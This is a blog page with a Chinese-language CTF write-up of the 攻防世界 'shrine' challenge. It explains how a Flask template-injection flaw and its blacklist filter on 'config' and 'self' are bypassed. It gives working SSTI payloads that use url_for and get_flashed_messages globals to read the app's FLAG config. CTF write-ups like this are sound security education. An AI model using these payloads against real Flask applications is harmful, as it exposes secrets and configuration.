<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>攻防世界-shrine write up - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="攻防世界-shrine write up" />
<meta property="og:description" content="打开靶机，发现源码是没有排序的python代码，CTRL&#43;u 查看源码：
可知：引入了flask和os库，render_template_string（）函数说明引入了SSTI（详见上一篇easy_tornado1），
@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;) 在/shrine/路径下提交参数，
app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;) 说明注册了FLAG，而flag可能就在这里面，
s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) blacklist = [&#39;config&#39;, &#39;self&#39;] 这两行说明他把（和）都替换成了空格，而且把config跟self加进了黑名单，那么就不能使用config来查看FLAG的内容了，没有过滤可以直接{undefined{config}}查看所有app.config。
return &#39;&#39;.join([&#39;{{% set {}=None% }}&#39;.format(c) for c in blacklist]) &#43; s 这一行把blacklist里的所有东西遍历为空。
但是pythonflask框架有其他内置函数和·变量：Python中Flask框架的变量和函数 - 简书 (jianshu.com)
用内置函数url_for，构造payload:
/shrine/{{url_for.__globals__}}
图上传不了了，，救命，反正就是会发现一大堆代码，中间有个非常亮眼的 &#39;current_app&#39;: &lt;Flask &#39;app&#39;&gt;。利用url_for()函数查看current_app里的flag:
构建payload：/shrine/{{url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]}}
或者用get_flashed_message函数：
构建payload：
/shrine/{{get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]}}
flag：flag{shrine_is_good_ssti}（岂可休，我上传不了图片orz）
拓展：
url_for：
会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接，经常用于超链接
get_flashed_message：
这个函数返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/78cbd711a85586c8b875795d730dff2d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-26T21:30:54+08:00" />
<meta property="article:modified_time" content="2022-04-26T21:30:54+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">攻防世界-shrine write up</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>打开靶机，发现源码是没有排序的python代码，CTRL+u 查看源码：</p> 
<p> </p> 
<p style="text-align:center;"><img alt="" src="https://images2.imgbox.com/5b/e9/TpigIDYF_o.jpg"></p> 
<p>可知：引入了flask和os库，render_template_string（）函数说明引入了SSTI（详见上一篇easy_tornado1），</p> 
<p>@app.route('/shrine/&lt;path:shrine&gt;') 在/shrine/路径下提交参数，</p> 
<p>app.config['FLAG'] = os.environ.pop('FLAG') 说明注册了FLAG，而flag可能就在这里面，</p> 
<p> s = s.replace('(', '').replace(')', '') <br> blacklist = ['config', 'self']   这两行说明他把（和）都替换成了空格，而且把config跟self加进了黑名单，那么就不能使用config来查看FLAG的内容了，没有过滤可以直接{undefined{config}}查看所有app.config。</p> 
<p>return ''.join(['{<!-- -->{% set {}=None% }}'.format(c) for c in blacklist]) + s 这一行把blacklist里的所有东西遍历为空。</p> 
<p>但是pythonflask框架有其他内置函数和·变量：<a href="https://www.jianshu.com/p/dee790b0ad75" rel="nofollow" title="Python中Flask框架的变量和函数 - 简书 (jianshu.com)">Python中Flask框架的变量和函数 - 简书 (jianshu.com)</a></p> 
<p>用内置函数url_for，构造payload:</p> 
<blockquote> 
 <p>/shrine/{<!-- -->{url_for.__globals__}}</p> 
</blockquote> 
<p>图上传不了了，，救命，反正就是会发现一大堆代码，中间有个非常亮眼的<strong> 'current_app': &lt;Flask 'app'&gt;。</strong>利用url_for()函数查看current_app里的flag:</p> 
<blockquote> 
 <p>构建payload：/shrine/{<!-- -->{url_for.__globals__['current_app'].config['FLAG']}}</p> 
</blockquote> 
<p> 或者用get_flashed_message函数：</p> 
<p>构建payload：</p> 
<blockquote> 
 <p>/shrine/{<!-- -->{get_flashed_messages.__globals__['current_app'].config['FLAG']}}</p> 
 <p> </p> 
</blockquote> 
<p> flag：flag{shrine_is_good_ssti}（岂可休，我上传不了图片orz）</p> 
<p>拓展：</p> 
<p>url_for：</p> 
<p>会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接，经常用于超链接</p> 
<p>get_flashed_message：</p> 
<p>这个函数返回之前在<a href="https://so.csdn.net/so/search?q=Flask&amp;spm=1001.2101.3001.7020" title="Flask">Flask</a>中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p> 
<p><br><br>  </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/77ae52c5e605ff2171a80095d4221d5d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">ctfshow SQL注入Web171-174</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/997725f1d9994d6192690d6d11b0a22a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Java中 String 转 Long 类型需要注意的事项</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>